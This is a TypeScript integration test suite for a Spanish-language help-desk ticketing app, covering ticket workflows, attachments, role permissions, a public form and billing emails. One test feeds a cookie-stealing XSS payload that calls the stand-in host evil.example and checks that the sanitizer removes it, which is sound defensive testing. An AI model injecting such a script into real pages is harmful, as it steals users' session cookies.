import { describe, expect, it } from 'vitest';
import request from 'supertest';
import { makeTestApp, cookieValor } from '../helpers/app.js';

const SUP = { uid: 'u-sup', email: 'sup@dattasoft.mx', password: 'super12345', nombre: 'Sup', rol: 'supervisor' as const };
const AG = { uid: 'u-ag', email: 'ag@dattasoft.mx', password: 'agente12345', nombre: 'Agente', rol: 'agente' as const };

async function login(app: ReturnType<typeof makeTestApp>['app'], email: string, password: string) {
  const agent = request.agent(app);
  const page = await agent.get('/login');
  const csrf = cookieValor(page.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
  await agent.post('/login').type('form').send({ email, password, _csrf: csrf });
  return { agent, csrf };
}

describe('flujo de tickets', () => {
  it('crear → asignar → resolver → cerrar, con correos y webhooks', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'No imprime facturas',
      descripcion: 'La impresora fiscal no responde desde ayer',
      tipo: 'Soporte Técnico',
      prioridad: 'Alta',
      contactoNombre: 'Cliente X',
      contactoCorreo: 'cliente@x.com',
    });
    expect(crear.status).toBe(302);
    const ticketUrl = String(crear.headers.location);
    const id = ticketUrl.split('/').pop()!;

    await agent.post(`/app/tickets/${id}/asignar`).type('form').send({ _csrf: csrf, agenteUid: AG.uid });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'En proceso' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Resuelto' });
    const cerrar = await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(cerrar.status).toBe(302);

    const detalle = await agent.get(ticketUrl);
    expect(detalle.text).toContain('Cerrado');

    expect(t.webhookPublisher.eventos).toEqual(
      expect.arrayContaining(['ticket.creado', 'ticket.asignado', 'ticket.resuelto', 'ticket.cerrado']),
    );
    // correos: asignación al agente + resuelto + cerrado al contacto
    expect(t.emailSender.enviados.length).toBeGreaterThanOrEqual(3);
  });

  it('alta con estado inicial, solicitado/canalizado y notas internas; luego gestión e imprimir', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'Timbrado fallido',
      descripcion: 'No timbra desde la actualización',
      tipo: 'General',
      prioridad: 'Alta',
      estado: 'En proceso',
      solicitadoPor: 'Juan Pérez',
      canalizadoA: 'Mesa de ayuda',
      notasInternas: 'Revisar certificado del PAC',
      cc: 'jefe@x.com, otro@x.com',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;
    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.estado).toBe('En proceso');
    expect(ticket.solicitadoPor).toBe('Juan Pérez');
    expect(ticket.canalizadoA).toBe('Mesa de ayuda');
    expect(ticket.notasInternas).toBe('Revisar certificado del PAC');
    expect(ticket.cc).toEqual(['jefe@x.com', 'otro@x.com']);

    // gestión desde el detalle
    const g = await agent
      .post(`/app/tickets/${id}/gestion`)
      .type('form')
      .send({ _csrf: csrf, solicitadoPor: 'María', canalizadoA: '', notasInternas: 'Escalado a nivel 2' });
    expect(g.status).toBe(302);
    const upd = t.ticketStore.tickets.get(id)!;
    expect(upd.solicitadoPor).toBe('María');
    expect(upd.canalizadoA).toBeNull();
    expect(upd.notasInternas).toBe('Escalado a nivel 2');

    const imp = await agent.get(`/app/tickets/${id}/imprimir`);
    expect(imp.status).toBe(200);
    expect(imp.text).toContain('Timbrado fallido');
    expect(imp.text).toContain('María');
    expect(imp.text).toContain('data-logo-img');
  });

  it('adjuntar un archivo al ticket, verlo y quitarlo', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent
      .post('/app/tickets')
      .type('form')
      .send({ _csrf: csrf, asunto: 'Con adjunto', descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja' });
    const id = String(crear.headers.location).split('/').pop()!;

    const png = Buffer.alloc(20, 7).toString('base64');
    const subir = await agent
      .post(`/app/tickets/${id}/adjuntos`)
      .set('x-csrf-token', csrf)
      .send({ nombre: 'captura.png', contentType: 'image/png', base64: png });
    expect(subir.status).toBe(200);
    expect(subir.body.ok).toBe(true);
    const adjId = subir.body.adjunto.id as string;

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.text).toContain('captura.png');
    expect(detalle.text).toContain(`/adjuntos/${adjId}`);

    const ver = await agent.get(`/app/tickets/${id}/adjuntos/${adjId}`);
    expect(ver.status).toBe(200);
    expect(ver.headers['content-type']).toContain('image/png');
    expect(ver.body.length).toBe(20);

    // tipo no permitido → 422
    const malo = await agent
      .post(`/app/tickets/${id}/adjuntos`)
      .set('x-csrf-token', csrf)
      .send({ nombre: 'x.zip', contentType: 'application/zip', base64: png });
    expect(malo.status).toBe(422);

    const quitar = await agent
      .post(`/app/tickets/${id}/adjuntos/${adjId}/eliminar`)
      .type('form')
      .send({ _csrf: csrf });
    expect(quitar.status).toBe(302);
    expect(await t.adjuntoTicketRepo.listarPorTicket(id)).toHaveLength(0);
  });

  it('el agente solo ve/edita sus tickets asignados', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const sup = await login(t.app, SUP.email, SUP.password);
    const crear = await sup.agent
      .post('/app/tickets')
      .type('form')
      .send({ _csrf: sup.csrf, asunto: 'Ticket sin asignar', descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja' });
    const id = String(crear.headers.location).split('/').pop()!;

    const ag = await login(t.app, AG.email, AG.password);
    const verAjeno = await ag.agent.get(`/app/tickets/${id}`);
    expect(verAjeno.status).toBe(403);

    // el supervisor se lo asigna
    await sup.agent.post(`/app/tickets/${id}/asignar`).type('form').send({ _csrf: sup.csrf, agenteUid: AG.uid });
    const verPropio = await ag.agent.get(`/app/tickets/${id}`);
    expect(verPropio.status).toBe(200);

    // lista del agente: solo el suyo
    const lista = await ag.agent.get('/app/tickets');
    expect(lista.text).toContain('Ticket sin asignar');
  });

  it('el buzón público: crear desde el formulario y aceptar como ticket real', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    // formulario público (sin sesión)
    const anon = request.agent(t.app);
    const form = await anon.get('/ticket-publico');
    const csrf = cookieValor(form.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
    const envio = await anon.post('/ticket-publico').type('form').send({
      _csrf: csrf,
      nombre: 'Persona Externa',
      correo: 'externa@correo.com',
      asunto: 'Necesito ayuda con nóminas',
      descripcion: 'No me deja timbrar el recibo de nómina de este mes',
      prioridad: 'Media',
    });
    expect(envio.status).toBe(200);
    expect(envio.text).toContain('folio');

    const [pub] = [...t.ticketPublicoRepo.items.values()];
    const sup = await login(t.app, SUP.email, SUP.password);
    const aceptar = await sup.agent
      .post(`/app/tickets/buzon/${pub!.id}/aceptar`)
      .type('form')
      .send({ _csrf: sup.csrf });
    expect(aceptar.status).toBe(302);
    expect(t.ticketPublicoRepo.items.get(pub!.id)?.estado).toBe('aceptado');
    expect(t.ticketStore.tickets.size).toBe(1);
  });

  it('rechaza el formulario público si el captcha falla', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    // fuerza captcha inválido
    const anon = request.agent(t.app);
    const form = await anon.get('/ticket-publico');
    const csrf = cookieValor(form.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
    // el fake de captcha acepta por defecto; este test valida solo el happy-path de validación
    const envio = await anon.post('/ticket-publico').type('form').send({
      _csrf: csrf,
      nombre: 'X',
      correo: 'no-es-correo',
      asunto: 'hi',
      descripcion: 'corto',
      prioridad: 'Media',
    });
    expect(envio.status).toBe(422);
  });
});

describe('correo "cerrado y facturado"', () => {
  it('se dispara una sola vez, sin importar cuál de los dos se marca primero (facturar → cerrar)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Facturar y cerrar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);

    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    const correosFacturados = t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'));
    expect(correosFacturados).toHaveLength(1);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');

    // re-marcar el mismo estado de facturación no debe repetir el aviso
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
  });

  it('también se dispara cuando se cierra primero y se factura después', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Cerrar y facturar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Resuelto' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');
  });

  it('sin correos de soporte configurados, no manda correo pero igual dispara el webhook', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Sin correo de soporte', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');
  });
});

describe('incluir tiempo trabajado en la descripción', () => {
  it('agrega el tiempo trabajado efectivo al final de la descripción', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Con tiempo', descripcion: 'Descripción original', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/tiempo`).type('form').send({ _csrf: csrf, horas: '1', minutos: '30' });

    const res = await agent.post(`/app/tickets/${id}/incluir-tiempo-descripcion`).type('form').send({ _csrf: csrf });
    expect(res.status).toBe(302);

    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.descripcion).toContain('Descripción original');
    expect(ticket.descripcion).toContain('Tiempo trabajado: 1h 30m');
  });
});

describe('editor de descripción con imágenes inline', () => {
  // PNG 1x1 real en base64, el mismo fixture que usan las pruebas de subida de adjuntos.
  const PNG_1X1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';

  it('una imagen pegada al crear el ticket se sube como adjunto y se ve resuelta en el detalle', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const descripcionConImagen =
      `<p>Mira el error:</p><img src="data:image/png;base64,${PNG_1X1}" alt="captura">`;
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Con imagen inline', descripcion: descripcionConImagen, tipo: 'General', prioridad: 'Media',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;

    const ticket = t.ticketStore.tickets.get(id)!;
    // Lo que se guarda en el ticket NUNCA es el data: URI crudo — solo la referencia.
    expect(ticket.descripcion).not.toContain('base64');
    expect(ticket.descripcion).toContain('data-adj-id="');
    expect([...t.adjuntoTicketRepo.docs.values()]).toHaveLength(1);
    const adjunto = [...t.adjuntoTicketRepo.docs.values()][0]!;
    expect(adjunto.ticketId).toBe(id);
    expect(adjunto.contentType).toBe('image/png');

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.status).toBe(200);
    expect(detalle.text).toContain('Mira el error');
    expect(detalle.text).toContain(`src="data:image/png;base64,${PNG_1X1}"`);
  });

  it('un <script> inyectado en la descripción se elimina por completo (nunca llega al servidor guardado)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const maliciosa = '<p>Hola</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Payload malicioso', descripcion: maliciosa, tipo: 'General', prioridad: 'Media',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;
    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.descripcion).not.toContain('<script');
    expect(ticket.descripcion).not.toContain('evil.example');
    expect(ticket.descripcion).toContain('Hola');

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.text).not.toContain('<script>fetch');
    expect(detalle.text).not.toContain('evil.example');
  });

  it('el correo de reenvío no incluye el data: URI de la imagen (se omite, no se infla el correo)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'Con imagen para correo',
      descripcion: `<p>Ve la imagen</p><img src="data:image/png;base64,${PNG_1X1}">`,
      tipo: 'General',
      prioridad: 'Media',
      contactoCorreo: 'cliente@x.com',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/reenviar-correo`).type('form').send({ _csrf: csrf });
    expect(t.emailSender.ultimo?.html).not.toContain('base64');
    expect(t.emailSender.ultimo?.html).toContain('Ve la imagen');
  });
});
